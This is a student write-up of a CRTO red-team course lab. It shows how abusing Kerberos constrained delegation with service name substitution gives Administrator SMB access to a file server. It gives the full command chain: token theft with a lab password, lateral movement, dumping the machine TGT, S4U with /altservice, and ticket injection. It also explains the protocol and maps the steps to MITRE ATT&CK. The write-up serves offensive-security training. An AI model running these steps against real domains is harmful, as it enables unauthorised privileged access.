# CRTO — Service Name Substitution Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Service Name Substitution
**Objective:** Abuse constrained delegation combined with service name substitution to obtain a service ticket for a more useful service class than what's explicitly delegated

---

## The Full Chain

```
Confirm constrained delegation on lon-ws-1$ (msDS-AllowedToDelegateTo: time/lon-dc-1 or similar non-CIFS SPN)
    ↓
Impersonate rsteel → lateral move to lon-ws-1 (SYSTEM Beacon)
    ↓
krb_dump /luid:3e7 /service:krbtgt → extract machine account TGT
    ↓
krb_s4u /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
    ↓
KDC issues TGS for time/lon-fs-1 as Administrator
    ↓
/altservice substitutes "time" → "cifs" in the ticket's SPN field
    ↓
Inject ticket → ls \\lon-fs-1\c$ succeeds as Administrator
```

---

## What Is Service Name Substitution?

This technique exploits a Kerberos design characteristic: **the service name (SPN class) in a TGS is not cryptographically protected** — it's in the unencrypted portion of the ticket. This means it can be modified after the KDC issues it without invalidating the ticket's integrity.

```
KDC issues:   TGS for Administrator → time/lon-fs-1   (delegated SPN)
Rubeus swaps: time/lon-fs-1  →  cifs/lon-fs-1         (altservice substitution)
Target sees:  TGS for Administrator → cifs/lon-fs-1   (accepts it — host validates session key, not SPN class)
```

> The target server (`lon-fs-1`) validates the **session key** and **PAC (Privilege Attribute Certificate)** — not the SPN class string. So even after substitution, the ticket is cryptographically valid and accepted.

---

## Why This Matters — The Problem It Solves

In the Constrained Delegation lab, `lon-ws-1$` was explicitly delegated to `cifs/lon-fs-1` — a directly useful SPN. In the real world, machines are often delegated to **non-interactive service SPNs** that aren't useful for lateral movement on their own:

| Delegated SPN | Service Class | Useful for lateral movement? |
|---|---|---|
| `cifs/lon-fs-1` | SMB file access | ✅ Directly useful |
| `time/lon-dc-1` | Windows Time service | ❌ Not useful alone |
| `wsman/lon-dc-1` | WinRM | ✅ Directly useful |
| `http/lon-web-1` | HTTP/IIS | Situational |
| `MSSQLSvc/lon-db-1` | SQL Server | ✅ Useful for SQL access |

Service name substitution lets you get delegated to `time/lon-fs-1` (useless) and convert it to `cifs/lon-fs-1` (SMB admin access) — as long as the **host** is the same.

> **The key constraint:** You can substitute the service *class* (the part before the `/`) but the *host* must remain the same. `time/lon-fs-1` → `cifs/lon-fs-1` works. `time/lon-fs-1` → `cifs/lon-dc-1` does not — different host, different encryption key.

---

## Step 1 — Enumeration and Setup

```bash
# Confirm constrained delegation (same as previous lab)
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

# Impersonate rsteel
steal_token [rsteel_pid]    # or make_token CONTOSO\rsteel Passw0rd!

# Set spawnto + lateral move
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-ws-1 smb
```

---

## Step 2 — Dump Machine Account TGT

```bash
krb_dump /luid:3e7 /service:krbtgt
```

> Same as Constrained Delegation lab — `/luid:3e7` targets the SYSTEM session where the machine account TGT always lives.

---

## Step 3 — S4U with Service Name Substitution

```bash
krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/ticket` | Base64 machine TGT | lon-ws-1$'s TGT for S4U authentication |
| `/service` | `time/lon-fs-1` | The SPN that **is** in `msDS-AllowedToDelegateTo` — what the KDC will actually issue |
| `/altservice` | `cifs` | The service class to **substitute** into the ticket after KDC issuance |
| `/impersonateuser` | `Administrator` | User to impersonate via S4U2Self → S4U2Proxy |

**Step-by-step protocol flow:**

```
1. S4U2Self:
   lon-ws-1$ → KDC: TGS for Administrator → lon-ws-1$ (forwardable)

2. S4U2Proxy:
   lon-ws-1$ → KDC: TGS for Administrator → time/lon-fs-1
   KDC validates: time/lon-fs-1 is in msDS-AllowedToDelegateTo ✅
   KDC issues: TGS for Administrator → time/lon-fs-1

3. Service Name Substitution (local, post-issuance):
   Rubeus/CS modifies the SPN field: time/lon-fs-1 → cifs/lon-fs-1
   Ticket session key and PAC remain intact — cryptographically valid

4. Result: TGS for Administrator → cifs/lon-fs-1
```

---

## Step 4 — Inject and Access

```bash
# Create sacrificial session
make_token CONTOSO\Administrator FakePass

# Inject the substituted ticket
kerberos_ticket_use [path to ticket]

# Verify
run klist

# Access target
ls \\lon-fs-1\c$
```

---

## Service Name Substitution — What You Can Substitute To

Since the host must match, the value of substitution depends on which service classes share the same host as the delegated SPN:

| Substitute To | Access Gained |
|---|---|
| `cifs` | SMB — file shares, C$ admin share, lateral movement |
| `host` | Broad access — covers many services including scheduled tasks, WMI |
| `wsman` | WinRM — PowerShell remoting |
| `http` | IIS/web application access |
| `ldap` | LDAP queries against that host (useful if host is a DC) |
| `MSSQLSvc` | SQL Server access (if SQL is on the same host) |

> Substituting to `host` is often the most powerful — the `HOST` SPN class covers a wide range of services and is effectively equivalent to local admin access on the target machine.

---

## Constrained Delegation Lab vs Service Name Substitution Lab

| Property | Constrained Delegation Lab | Service Name Substitution Lab |
|---|---|---|
| Delegated SPN | `cifs/lon-fs-1` (directly useful) | `time/lon-fs-1` (not useful alone) |
| `/altservice` used | No | Yes — substitute `time` → `cifs` |
| Rubeus command | `krb_s4u /service:cifs/lon-fs-1` | `krb_s4u /service:time/lon-fs-1 /altservice:cifs` |
| KDC validates | `cifs/lon-fs-1` in allowed list | `time/lon-fs-1` in allowed list |
| Ticket delivered | `cifs/lon-fs-1` as Administrator | `cifs/lon-fs-1` as Administrator (substituted) |
| End result | Same — C$ access on lon-fs-1 | Same — C$ access on lon-fs-1 |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1558.001 | Steal or Forge Kerberos Tickets | Machine TGT extraction + S4U ticket manipulation |
| T1550.003 | Pass the Ticket | Inject substituted TGS into sacrificial session |
| T1134.001 | Access Token Manipulation | Impersonate Administrator via S4U |

---

## Key Takeaways

- Service name substitution exploits the fact that the **SPN class is not cryptographically protected** in a Kerberos TGS — the session key and PAC are, but not the SPN string
- The **host must remain the same** — you can swap `time` → `cifs` on the same host but cannot redirect to a different machine
- This technique unlocks constrained delegation configs that look useless at first glance — `time/`, `termsrv/`, `wsman/` delegations all become `cifs/` or `host/` with a single flag
- `/altservice` in `krb_s4u` is the only difference from the standard constrained delegation workflow — everything else is identical
- Substituting to `host` is often the highest-value swap — it covers the broadest set of services on the target
- On real engagements, always enumerate `msDS-AllowedToDelegateTo` values fully — don't dismiss non-CIFS SPNs as useless without considering substitution
